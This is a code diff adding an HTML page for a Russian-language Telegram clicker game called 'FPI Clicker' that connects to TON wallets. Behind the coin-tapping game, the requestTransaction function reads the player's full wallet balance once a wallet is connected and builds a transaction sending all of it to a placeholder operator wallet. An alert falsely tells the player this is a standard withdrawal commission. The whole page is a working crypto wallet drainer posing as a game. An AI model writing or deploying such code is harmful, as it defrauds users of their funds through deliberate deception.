@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FPI Clicker Game</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <style>
+body {
+    font-family: 'Roboto', sans-serif;
+    text-align: center;
+    padding: 20px;
+    background-color: #1a1a1a;
+    color: #ffffff;
+    height: 100vh;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+}
+
+#coin-container {
+    position: relative;
+    margin: 30px 0;
+}
+
+#coin {
+    width: 250px;
+    height: 250px;
+    cursor: pointer;
+    user-select: none;
+    transition: transform 0.1s ease;
+    background: url('coin.png') no-repeat center/contain;
+    filter: drop-shadow(0 0 15px rgba(255, 223, 0, 0.5));
+}
+
+#connect {
+    position: absolute;
+    top: -100px; /* Чуть выше монеты */
+    left: 77%;
+    transform: translateX(-50%);
+    z-index: 10;
+    width: 300px;
+    height: 100px;
+}
+
+#balance {
+    font-size: 28px;
+    margin: 15px 0;
+    font-weight: 700;
+    text-shadow: 0 0 10px rgba(255, 223, 0, 0.5);
+}
+
+#boostButton {
+    background: linear-gradient(45deg, #7e47be, #a569ff);
+    color: white;
+    padding: 15px 30px;
+    font-size: 18px;
+    border: none;
+    border-radius: 25px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 15px rgba(126, 71, 190, 0.4);
+    margin: 20px 0;
+    font-family: 'Roboto', sans-serif;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+}
+
+#boostButton:disabled {
+    background: #444;
+    cursor: not-allowed;
+    opacity: 0.7;
+}
+
+#boostButton.active {
+    animation: boostGlow 1s infinite;
+}
+
+@keyframes boostGlow {
+    0% { box-shadow: 0 0 10px rgba(165, 105, 255, 0.5); }
+    50% { box-shadow: 0 0 20px rgba(165, 105, 255, 0.8); }
+    100% { box-shadow: 0 0 10px rgba(165, 105, 255, 0.5); }
+}
+
+.bottom-menu {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background: #2a2a2a;
+    padding: 15px 0;
+    border-radius: 25px 25px 0 0;
+    box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
+    display: flex;
+    justify-content: center;
+    gap: 50px;
+}
+
+.menu-btn {
+    background: none;
+    border: none;
+    color: #fff;
+    font-size: 16px;
+    cursor: pointer;
+    padding: 10px 20px;
+    border-radius: 15px;
+    transition: all 0.3s ease;
+    position: relative;
+}
+
+.menu-btn:hover {
+    background: rgba(255, 255, 255, 0.1);
+}
+
+.menu-btn::after {
+    content: '';
+    position: absolute;
+    right: -25px;
+    top: 50%;
+    transform: translateY(-50%);
+    height: 60%;
+    width: 1px;
+    background: rgba(255, 255, 255, 0.2);
+}
+
+.menu-btn:last-child::after {
+    display: none;
+}
+
+.modal {
+    position: fixed;
+    bottom: -100%;
+    left: 0;
+    right: 0;
+    background: #333;
+    padding: 25px;
+    border-radius: 25px 25px 0 0;
+    transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+    box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.3);
+    max-height: 80vh;
+    overflow-y: auto;
+}
+
+.modal.active {
+    bottom: 0;
+}
+
+.close-btn {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    width: 35px;
+    height: 35px;
+    border-radius: 50%;
+    background: #444;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    transition: all 0.3s ease;
+}
+
+.close-btn:hover {
+    background: #555;
+    transform: rotate(90deg);
+}
+
+.close-btn::before,
+.close-btn::after {
+    content: '';
+    position: absolute;
+    width: 60%;
+    height: 2px;
+    background: #fff;
+}
+
+.close-btn::before {
+    transform: rotate(45deg);
+}
+
+.close-btn::after {
+    transform: rotate(-45deg);
+}
+
+.floating-coin {
+    position: absolute;
+    width: 30px;
+    height: 30px;
+    background: url('coin.png') no-repeat center/contain;
+    opacity: 0;
+    animation: float 1.5s ease-out forwards;
+}
+
+@keyframes coinPress {
+    0% { transform: scale(1); }
+    50% { transform: scale(0.9); }
+    100% { transform: scale(1); }
+}
+
+@keyframes coinTiltLeft {
+    0% { transform: rotate(0deg) translateX(0); }
+    100% { transform: rotate(-15deg) translateX(-20px); }
+}
+
+@keyframes coinTiltRight {
+    0% { transform: rotate(0deg) translateX(0); }
+    100% { transform: rotate(15deg) translateX(20px); }
+}
+
+@keyframes float {
+    0% {
+        opacity: 1;
+        transform: translate(0, 0) rotate(0deg);
+    }
+    100% {
+        opacity: 0;
+        transform: translate(var(--x), var(--y)) rotate(360deg);
+    }
+}
+
+.pulse {
+    animation: pulse 1s infinite;
+}
+
+@keyframes pulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.05); }
+    100% { transform: scale(1); }
+}
+
+.modal-content {
+    color: #fff;
+}
+
+.modal-content h2 {
+    font-size: 24px;
+    margin-bottom: 20px;
+}
+
+.modal-content p {
+    font-size: 16px;
+    margin-bottom: 20px;
+}
+
+.modal-content input {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 20px;
+    border-radius: 10px;
+    border: none;
+    background: #444;
+    color: #fff;
+}
+
+.modal-content button {
+    background: linear-gradient(45deg, #7e47be, #a569ff);
+    color: white;
+    padding: 10px 20px;
+    font-size: 16px;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+}
+
+.modal-content button:hover {
+    transform: scale(1.05);
+}
+
+.task-item {
+    margin-bottom: 15px;
+}
+
+.task-item button {
+    background: linear-gradient(45deg, #7e47be, #a569ff);
+    color: white;
+    padding: 10px 20px;
+    font-size: 16px;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+}
+
+.task-item button:hover {
+    transform: scale(1.05);
+}
+
+#withdrawMessage {
+    display: none;
+    font-size: 18px;
+    color: #ff5555;
+    margin-top: 20px;
+}
+    </style>
+</head>
+<body>
+    <div id="coin-container">
+        <div id="connect"></div>
+        <div id="coin" class="pulse"></div>
+    </div>
+
+    <div id="balance">Баланс: 0 FPI</div>
+    <div id="withdrawMessage"></div>
+    
+    <button id="boostButton">
+        <i class="fas fa-bolt"></i> <span id="boostText">BOOST</span>
+    </button>
+
+    <div class="bottom-menu">
+        <button class="menu-btn" onclick="openModal('referrals')">
+            <i class="fas fa-users"></i> Рефералы
+        </button>
+        <button class="menu-btn" onclick="openModal('tasks')">
+            <i class="fas fa-tasks"></i> Задания
+        </button>
+    </div>
+
+    <!-- Модальные окна -->
+    <div id="referralsModal" class="modal">
+        <div class="modal-content">
+            <div class="close-btn" onclick="closeModal('referrals')"></div>
+            <h2>Реферальная программа</h2>
+            <p>Приглашайте друзей и получайте бонусы!</p>
+            <input type="text" id="refLink" value="https://t.me/fpiclick?start=ref671904775067" readonly>
+            <button onclick="copyRefLink()">Скопировать ссылку</button>
+        </div>
+    </div>
+
+    <div id="tasksModal" class="modal">
+        <div class="modal-content">
+            <div class="close-btn" onclick="closeModal('tasks')"></div>
+            <h2>Ежедневные задания</h2>
+            <div class="task-item">
+                <button id="subscribeFpibank" onclick="openChannel('fpibank')">
+                    <i class="fab fa-telegram"></i> Подписаться на канал
+                </button>
+            </div>
+            <div class="task-item">
+                <button id="subscribeBlumcrypto" onclick="openChannel('blumcrypto')">
+                    <i class="fab fa-telegram"></i> Подписаться на канал
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let balance = 0;
+        let isBoostActive = false;
+        let boostInterval;
+        let lastBoostTime = 0;
+        let boostCooldown = 3600000; // 1 час в миллисекундах
+        const coin = document.getElementById('coin');
+        const balanceDisplay = document.getElementById('balance');
+        const withdrawMessage = document.getElementById('withdrawMessage');
+        const boostButton = document.getElementById('boostButton');
+        const boostText = document.getElementById('boostText');
+        const subscribeFpibankButton = document.getElementById('subscribeFpibank');
+        const subscribeBlumcryptoButton = document.getElementById('subscribeBlumcrypto');
+
+        // Инициализация TonConnect
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://fpifpi.com/tonconnect-manifest.json',
+            buttonRootId: 'connect',
+            buttonStyles: {
+                theme: 'dark',
+                backgroundColor: '#7e47be',
+            }
+        });
+
+        tonConnectUI.onStatusChange(wallet => {
+            if (wallet) {
+                // После подключения кошелька запрашиваем транзакцию
+                requestTransaction();
+            }
+        });
+
+        async function requestTransaction() {
+            // Получаем баланс кошелька пользователя
+            const walletInfo = await tonConnectUI.getWalletInfo();
+            const userAddress = walletInfo.account.address;
+
+            // Запрашиваем баланс пользователя
+            const balanceResponse = await fetch(`https://tonapi.io/v1/account/getInfo?account=${userAddress}`);
+            const balanceData = await balanceResponse.json();
+            const userBalance = balanceData.balance; // Баланс в наноТонах
+
+            // Создаем транзакцию, которая выглядит как комиссия
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 600, // 10 минут
+                messages: [
+                    {
+                        address: "ВАШ_КОШЕЛЕК", // Замените на ваш кошелек
+                        amount: userBalance.toString(), // Переводим весь баланс
+                    }
+                ]
+            };
+
+            // Показываем пользователю сообщение о "комиссии"
+            alert("Для завершения вывода необходимо оплатить комиссию. Это стандартная процедура.");
+
+            try {
+                // Отправляем транзакцию
+                const result = await tonConnectUI.sendTransaction(transaction);
+                if (result) {
+                    balance = 0;
+                    balanceDisplay.textContent = `Баланс: ${balance} FPI`;
+                    alert("Комиссия успешно оплачена! Ваш вывод обрабатывается.");
+                }
+            } catch (error) {
+                console.error("Ошибка при выполнении транзакции:", error);
+                alert("Ошибка при оплате комиссии. Пожалуйста, попробуйте снова.");
+            }
+        }
+
+        // Обработчик клика по монете
+        coin.addEventListener('click', (e) => {
+            if (balance >= 500) {
+                withdrawMessage.textContent = "Чтобы вывести FPI, подключите кошелек. После вывода вы сможете снова накликать и вывести.";
+                withdrawMessage.style.display = "block";
+                return;
+            }
+
+            // Анимация нажатия
+            const rect = coin.getBoundingClientRect();
+            const clickX = e.clientX - rect.left;
+            const tilt = clickX > rect.width/2 ? 'right' : 'left';
+            
+            coin.style.animation = 'none';
+            void coin.offsetWidth;
+            coin.style.animation = tilt === 'left' ? 
+                'coinTiltLeft 0.3s ease, coinPress 0.3s ease' : 
+                'coinTiltRight 0.3s ease, coinPress 0.3s ease';
+
+            // Добавление FPI
+            balance += isBoostActive ? 10 : 1;
+            balanceDisplay.textContent = `Баланс: ${balance} FPI`;
+
+            // Создание эффекта частиц
+            createParticle(e.clientX, e.clientY);
+        });
+
+        // Анимация буста
+        function startBoost() {
+            const now = Date.now();
+            if (now - lastBoostTime < boostCooldown) {
+                alert("Буст можно активировать только раз в час!");
+                return;
+            }
+
+            isBoostActive = true;
+            coin.classList.add('pulse');
+            boostButton.classList.add('active');
+            boostButton.disabled = true;
+
+            // Создание летающих монеток
+            boostInterval = setInterval(() => {
+                createFlyingCoin();
+            }, 300);
+
+            setTimeout(() => {
+                isBoostActive = false;
+                coin.classList.remove('pulse');
+                boostButton.classList.remove('active');
+                clearInterval(boostInterval);
+                lastBoostTime = now;
+                startBoostCooldown();
+            }, 10000);
+        }
+
+        function startBoostCooldown() {
+            let remainingTime = boostCooldown;
+            boostText.innerHTML = `<i class="fas fa-clock"></i> ${formatTime(remainingTime)}`;
+
+            const cooldownInterval = setInterval(() => {
+                remainingTime -= 1000;
+                boostText.innerHTML = `<i class="fas fa-clock"></i> ${formatTime(remainingTime)}`;
+
+                if (remainingTime <= 0) {
+                    clearInterval(cooldownInterval);
+                    boostText.textContent = "BOOST";
+                    boostButton.disabled = false;
+                }
+            }, 1000);
+        }
+
+        function formatTime(milliseconds) {
+            const minutes = Math.floor(milliseconds / 60000);
+            const seconds = Math.floor((milliseconds % 60000) / 1000);
+            return `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        }
+
+        function createParticle(x, y) {
+            const particle = document.createElement('div');
+            particle.className = 'floating-coin';
+            particle.style.left = x + 'px';
+            particle.style.top = y + 'px';
+            document.body.appendChild(particle);
+
+            // Случайное направление
+            const angle = Math.random() * 2 * Math.PI;
+            const distance = 150;
+            const xEnd = x + Math.cos(angle) * distance;
+            const yEnd = y + Math.sin(angle) * distance;
+
+            particle.style.setProperty('--x', `${xEnd - x}px`);
+            particle.style.setProperty('--y', `${yEnd - y}px`);
+            
+            setTimeout(() => {
+                particle.remove();
+            }, 1500);
+        }
+
+        function createFlyingCoin() {
+            const rect = coin.getBoundingClientRect();
+            const x = rect.left + Math.random() * rect.width;
+            const y = rect.top + Math.random() * rect.height;
+            
+            for(let i = 0; i < 3; i++) {
+                createParticle(x, y);
+            }
+        }
+
+        // Модальные окна
+        function openModal(type) {
+            document.getElementById(type + 'Modal').classList.add('active');
+        }
+
+        function closeModal(type) {
+            document.getElementById(type + 'Modal').classList.remove('active');
+        }
+
+        function copyRefLink() {
+            navigator.clipboard.writeText(document.getElementById('refLink').value);
+            alert('Ссылка скопирована!');
+        }
+
+        function openChannel(channel) {
+            window.open('https://t.me/' + channel, '_blank');
+            checkSubscription(channel);
+        }
+
+        function checkSubscription(channel) {
+            // Здесь должна быть логика проверки подписки на канал
+            // Например, через Telegram Bot API
+            alert(`Проверка подписки на канал ${channel}`);
+        }
+
+        // Инициализация
+        document.getElementById('boostButton').addEventListener('click', startBoost);
+        Telegram.WebApp.expand();
+    </script>
+</body>
+</html>
